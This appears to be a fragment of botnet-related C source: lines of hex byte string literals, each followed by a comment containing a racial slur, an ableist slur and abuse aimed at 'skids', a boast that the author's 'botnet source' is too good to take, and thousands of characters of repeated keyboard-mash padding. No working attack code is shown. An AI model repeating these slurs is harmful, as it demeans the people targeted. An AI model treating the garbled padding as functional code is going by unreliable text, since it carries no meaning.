    "\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG